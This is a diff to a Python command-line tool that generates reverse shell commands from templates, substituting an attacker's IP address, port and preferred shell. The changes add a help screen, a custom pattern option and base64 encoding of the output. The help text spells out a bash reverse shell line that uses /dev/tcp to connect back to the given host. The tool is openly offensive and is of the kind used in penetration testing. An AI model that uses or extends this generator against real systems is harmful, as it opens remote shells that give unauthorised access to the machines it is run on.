@@ -20,10 +20,26 @@ def usage():
     ██║  ██║███████║╚██████╔╝    ╚██╔═██╔╝██╔╝
     ╚═╝  ╚═╝╚══════╝ ╚═════╝      ╚═╝ ╚═╝ ╚═╝
 
-    Usage: python3 {} <ip address> <port> [shell type]
-    Examples:
-        python3 {} 127.0.0.1 4444
-        python3 {} 192.168.0.1 443 bash
+    SYNOPSIS:
+        \033[32mpython3 {} <ip address> <port> [shell type]\033[0m
+
+      Examples:
+        \033[32mpython3 {} 127.0.0.1 4444\033[0m
+        \033[32mpython3 {} 192.168.0.1 443 bash\033[0m
+
+    OPTIONS SUMMARY:
+        -h, --help          Display this help screen
+        -l, --list-type     List available types
+        -v, --verbose       Set verbosity level
+        -b64                Output reverse shell base64 encoded
+
+      Mandatory arguments:
+        -H, --host          Specify host to use
+        -P, --port          Specify port to use
+        -T, --type          Shell type to use
+        -p, --pattern       Shell pattern to use
+                             following format: "BASH|[PREFERED_SHELL] -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1"
+
     '''.format(sys.argv[0],sys.argv[0],sys.argv[0]))
     sys.exit(-1)
 
@@ -50,7 +66,10 @@ def main(argv):
     port = '9001'
     host = ''
     type = ''
+    pattern = ''
+    pref_shell = 'bash'
     use_type = False
+    enc_b64 = False
 
 
     # argv = sys.argv[1:]
@@ -58,24 +77,30 @@ def main(argv):
     if len(argv) < 1:
         usage()
     try:
-        opts, args = getopt.getopt(argv, "H:p:T:hlv", ["host=", "port=", "type=", "help", "list-type", "verbose"])
+        opts, args = getopt.getopt(argv, "H:P:T:p:hlv", ["host=", "port=", "type=", "pattern=", "help", "list-type", "b64", "sh", "verbose"])
     except:
         print("Error Message ")
         sys.exit(2)
     for opt, arg in opts:
         if opt in ['-H', '--host']:
             host = arg
-        elif opt in ['-p', '--port']:
+        elif opt in ['-P', '--port']:
             port = arg
         elif opt in ('-T', '--type'):
             use_type = True
             type = arg
+        elif opt in ['-p', '--pattern']:
+            pattern = arg
         elif opt in ['-h', '--help']:
             usage()
             sys.exit()
         elif opt in ('-l', '--list-type'):
             list_types()
             sys.exit()
+        elif opt in ('--b64'):
+            enc_b64 = True
+        elif opt in ('--sh'):
+            pref_shell = 'sh'
         elif opt in ('-v', '--verbose'):
             global _verbose
             _verbose = 1
@@ -100,7 +125,7 @@ def main(argv):
             candidate_ips = grab_ip(output)
             if len(candidate_ips) == 0:
                 print("Can not find such hostname in any reolver")
-                exit_code(-1)
+                sys.exit(-1)
             else:
                 print(candidate_ips[0])
     ipaddr = candidate_ips[0]
@@ -108,7 +133,7 @@ def main(argv):
 
     if not verify_ip(ipaddr):
         print("ERROR. No interface showing a class of network which IP address belongs to. Exiting.")
-        exit_code(-1)
+        sys.exit(-1)
 
     shells = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'shells.txt')
 
@@ -122,6 +147,7 @@ def main(argv):
         desc, cmd = shell.split('|', 1)
         cmd = cmd.replace("[IPADDR]", ipaddr)
         cmd = cmd.replace("[PORT]", port)
+        cmd = cmd.replace("[PREFERED_SHELL]", pref_shell)
         if shell_type in desc:
             print(GREEN(desc))
             print(cmd)
